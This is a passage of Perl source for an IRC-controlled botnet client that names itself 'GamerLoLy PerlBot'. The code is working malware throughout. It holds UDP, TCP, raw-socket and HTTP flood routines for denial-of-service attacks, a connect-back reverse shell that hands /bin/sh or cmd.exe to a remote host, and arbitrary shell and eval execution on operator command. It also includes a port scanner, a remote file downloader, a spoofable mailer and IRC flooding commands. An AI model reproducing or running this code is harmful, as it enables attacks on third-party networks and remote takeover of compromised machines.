	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*ID           : 12$id");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1*Own Dir      : 12$ownd");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [System] 9,1=================== ");
}

if ($funcarg =~ /^version/){
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1================================== ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1Bot Informations:                  ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1================================== ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1*Bot Version : 12$version   ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1*Bot Creator : 12GamerLoLy             ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1*Bot Year    : 122012                ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Version] 9,1================================== ");
}

if ($funcarg =~ /^flood/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1GamerLoLy PerlBot - Flood Help: ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp1 <ip> <port> <time>               ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp2 <ip> <packet size> <time>        ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp3 <ip> <port> <time>               ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1tcp <ip> <port> <packet size> <time>  ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1http <site> <time>                    ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1ctcpflood <nick>                      ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1msgflood <nick>                       ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1noticeflood <nick>                    ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
}

if ($funcarg =~ /^channel/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1============================= ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1GamerLoLy PerlBot - Channel Help:     ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1============================= ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1join <channel>            ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1part <channel>            ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1rejoin <channel>          ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1op <channel> <nick>       ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1deop <channel> <nick>     ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1voice <channel> <nick>    ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1devoice <channel> <nick>  ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1nick <newnick>            ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1msg <nick>                ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1quit                      ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1die                       ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1============================= ");
}

if ($funcarg =~ /^utils/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1GamerLoLy PerlBot - Utils Help:                            ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1cback <ip> <port>                              ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1download <url+path> <file>                     ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1mail <subject> <sender> <recipient> <message>  ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1dns <ip>                                       ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1port <ip> <port>                               ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1portscan <ip>                                  ");	
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1!u pwd (for example)                               ");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
}

#########################
##### [ Functions ] #####
#########################

if ($funcarg =~ /^die/) {
	sendraw($IRC_cur_socket,"QUIT :");
	$killd ="kill -9".fork;
	system (`$killd`);
}
###########	
if ($funcarg =~ /^join (.*)/) {
	sendraw($IRC_cur_socket,"JOIN".$1);
}

if ($funcarg =~ /^part (.*)/) {
	sendraw($IRC_cur_socket,"PART".$1);
}
###########
if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my @portas=("1","7","9","14","20","21","22","23","25","53","80","88","110","112","113","137","143","145","222","333","405","443","444","445","512","587","616","666","993","995","1024","1025","1080","1144","1156","1222","1230","1337","1348","1628","1641","1720","1723","1763","1983","1984","1985","1987","1988","1990","1994","2005","2020","2121","2200","2222","2223","2345","2360","2500","2727","3130","3128","3137","3129","3303","3306","3333","3389","4000","4001","4471","4877","5252","5522","5553","5554","5642","5777","5800","5801","5900","5901","6062","6550","6522","6600","6622","6662","6665","6666","6667","6969","7000","7979","8008","8080","8081","8082","8181","8246","8443","8520","8787","8855","8880","8989","9855","9865","9997","9999","10000","10001","10010","10222","11170","11306","11444","12241","12312","14534","14568","15951","17272","19635","19906","19900","20000","21412","21443","21205","22022","30999","31336","31337","32768","33180","35651","36666","37998","41114","41215","44544","45055","45555","45678","51114","51247","51234","55066","55555","65114","65156","65120","65410","65500","65501","65523","65533");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [PortScan] 9,1Scanning for open ports on 12".$1."9,1started. ");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  if (@aberta) {
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [PortScan] 9,1Open ports found: 12@aberta ");
    } else {
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [PortScan] 9,1No open ports found. ");
  }
}
##############
if ($funcarg =~ /^download\s+(.*)\s+(.*)/) {
	getstore("$1","$2");
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Download] 9,1Downloaded the file: 12$2 9,1from 12$1 ");
}
##############
if ($funcarg =~ /^dns\s+(.*)/){ 
	my $nsku = $1;
	$mydns = inet_ntoa(inet_aton($nsku));
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [DNS] 9,1Resolved: 12$nsku 9,1to 12$mydns ");
}
##############
if ($funcarg=~ /^port\s+(.*?)\s+(.*)/ ) {
	my $hostip="$1";
	my $portsc="$2";
	my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
	if ($scansock) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [PORT] 9,1Connection to 12$hostip9,1:12$portsc 9,1is 12Accepted. ");
	}
	else {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [PORT] 9,1Connection to 12$hostip9,1:12$portsc 9,1is 4Refused. ");
	}
}
##############
if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta ="$2";
    my $dtime ="$3";
    my $pacote;
    my $pacotese;
	my $size = 0;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [UDP Attack] 9,1Attacking 12".$1."9,1On Port 12".$porta."9,1for 12".$dtime."9,1seconds. ");
	while (($pacota =="1") && ($pacotes =="1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime !="0"));
            $pacote = $size ? $size : int(rand(1024-64)+64) ;
            $porta = int(rand 65000) +1 if ($porta =="0");
            #send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo));
            send(Tr0x, pack("a$pacote","Tr0x"), 0, pack_sockaddr_in($porta, $alvo));
            }
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [UDP Attack] 9,1Attack for 12".$1."9,1finished in 12".$dtime."9,1seconds9,1. ");
}
##############
if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [UDP Attack] 9,1Attacking 12".$1."9,1with 12".$2."9,1Kb Packets for 12".$3."9,1seconds. ");
	my ($dtime, %pacotes) = udpflooder("$1","$2","$3");
	$dtime = 1 if $dtime == 0;
	my %bytes;
	$bytes{igmp} = $2 * $pacotes{igmp};
	$bytes{icmp} = $2 * $pacotes{icmp};
	$bytes{o} = $2 * $pacotes{o};
	$bytes{udp} = $2 * $pacotes{udp};
	$bytes{tcp} = $2 * $pacotes{tcp};
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [UDP Attack] 9,1Results 12".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)."9,1Kb in 12".$dtime."9,1seconds to 12".$1."9,1. ");
}
##############
if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta ="$2";
    my $dtime ="$3";
    my $pacote;
    my $pacotese;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [UDP Attack] 9,1Attacking 12".$1."9,1On Port 12".$porta."9,1for 12".$dtime."9,1seconds. ");
	while (($pacota =="1") && ($pacotes =="1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime !="0"));
            $pacote= $rand x $rand x $rand;
            $porta = int(rand 65000) +1 if ($porta =="0");
            send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes =="1");
            }
    sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [UDP Attack] 9,1Results 12".$pacotese."9,1Kb in 12".$dtime."9,1seconds to 12".$1."9,1. ");
}
##############

##############
if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [TCP Attack] 9,1Attacking 12".$1.":".$2."9,1for 12".$3."9,1seconds. ");
	my $itime = time;
	my ($cur_time);
	$cur_time = time - $itime;
	while ($3>$cur_time){
	$cur_time = time - $itime;
	&tcpflooder("$1","$2","$3");
}
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [TCP Attack] 9,1Attack ended on: 12".$1.":".$2."9,1. ");
}
##############
if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1[HTTP Attack] 9,1Attacking 12".$1."9,1on port 80 for 12".$2."9,1seconds. ");
	my $itime = time;
	my ($cur_time);
	$cur_time = time - $itime;
	while ($2>$cur_time){
	$cur_time = time - $itime;
	my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
	print $socket"GET / HTTP/1.1\r\nAccept: */*\r\nHost:".$1."\r\nConnection: Keep-Alive\r\n\r\n";
	close($socket);
}
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [HTTP Attack] 9,1Attacking ended on: 12".$1."9,1. ");
}
##############
if ($funcarg =~ /^cback\s+(.*)\s+(\d+)/) {
	my $host ="$1";
	my $port ="$2";
	my $proto = getprotobyname('tcp');
	my $iaddr = inet_aton($host);
	my $paddr = sockaddr_in($port, $iaddr);
	my $shell ="/bin/sh -i";
if ($^O eq"MSWin32") {
	$shell ="cmd.exe";
}
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [ConnectBack] 9,1Connecting to 12$host:$port ");
	socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die"socket: $!";
	connect(SOCKET, $paddr) or die"connect: $!";
	open(STDIN,">&SOCKET");
	open(STDOUT,">&SOCKET");
	open(STDERR,">&SOCKET");
	system("$shell");
	close(STDIN);
	close(STDOUT);
	close(STDERR);
}
##############
if ($funcarg =~ /^mail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Mailer] 9,1Sending email to: 12$3 ");
	$subject = $1;
	$sender = $2;
	$recipient = $3;
	@corpo = $4;
	$mailtype ="content-type: text/html";
	$sendmail = '/usr/sbin/sendmail';
	open (SENDMAIL,"| $sendmail -t");
	print SENDMAIL"$mailtype\n";
	print SENDMAIL"Subject: $subject\n";
	print SENDMAIL"From: $sender\n";
	print SENDMAIL"To: $recipient\n\n";
	print SENDMAIL"@corpo\n\n";
	close (SENDMAIL);
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [Mailer] 9,1Email Sended to: 12$recipient ");
}
exit;
}
}
##############
if ($funcarg =~ /^ctcpflood (.*)/) {
    my $target ="$1";
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [IRCFlood] 9,1CTCP Attacking: 12".$target."");
	for (1..10) {
	sendraw($IRC_cur_socket,"PRIVMSG".$target.":\001VERSION\001\n");
	sendraw($IRC_cur_socket,"PRIVMSG".$target.":\001PING\001\n");
	}
}
##############
if ($funcarg =~ /^msgflood (.*)/) {
    my $target ="$1";
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [IRCFlood] 9,1MSG Flooding: 12".$target."");
    sendraw($IRC_cur_socket,"PRIVMSG".$target.":0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
}
##############
if ($funcarg =~ /^noticeflood (.*)/) {
    my $target ="$1";
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [IRCFlood] 9,1NOTICE Flooding: 12".$target."");
	for (1..2){
	sendraw($IRC_cur_socket,"NOTICE".$target.":0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
	}
}
##############

##############
sub ircase {
my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl","$kem") if $case eq"op";
      my $oarg = substr($case, 3);
      op("$1","$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl","$kem") if $case eq"deop";
      my $oarg = substr($case, 5);
      deop("$1","$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl","$kem") if $case eq"voice";
      $oarg = substr($case, 6);
      voice("$1","$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl","$kem") if $case eq"devoice";
      $oarg = substr($case, 8);
      devoice("$1","$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1","$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2","$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1","$2");
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2","$3");
      }
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1","$2");
   }
   elsif ($case =~ /^newerver\s+(\S+)\s+(\S+)/) {
       conectar("$2","$1","6667");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval"$1";
   }
   elsif ($case =~ /^join\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^part\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^quit/) {
     quit();
   }
}
##############
sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
	chdir("$1") || msg("$printl","No such file or directory");
	return;
} elsif ($pid = fork) {
	waitpid($pid, 0);
} else {
if (fork) {
	exit;
} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket,"PRIVMSG $printl :$linha");
  if ($c =="$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}
##############
sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
	$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
	socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
	socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
	socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
	socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
	return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
	while ( 1 ) {
for (my $port = 1;
	$port <= 65000; $port++) {
	$cur_time = time - $itime;
last if $cur_time >= $ftime;
	send(SOCK1, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{igmp}++;
	send(SOCK2, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{udp}++;
	send(SOCK3, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{icmp}++;
	send(SOCK4, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{tcp}++;
for (my $pc = 3;
	$pc <= 255;$pc++) {
next if $pc == 6;
	$cur_time = time - $itime;
last if $cur_time >= $ftime;
	socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
	send(SOCK5, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}
##############
sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
	$ia=inet_aton($_[0]);
	$pa=sockaddr_in($_[1],$ia);
	$ftime=$_[2];
	$proto=getprotobyname('tcp');
	$j=0;$l=0;
	$cur_time = time - $itime;
while ($l<1000){
	$cur_time = time - $itime;
last if $cur_time >= $ftime;
	$t="SOCK$l";
	socket($t,PF_INET,SOCK_STREAM,$proto);
	connect($t,$pa)||$j--;
	$j++;$l++;
}
	$l=0;
while ($l<1000){
	$cur_time = time - $itime;
last if $cur_time >= $ftime;
	$t="SOCK$l";
shutdown($t,2);
	$l++;
}
}
##############
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}
sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }

sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}

sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }

sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }

}

###################
##### [ EOF ] #####
###################
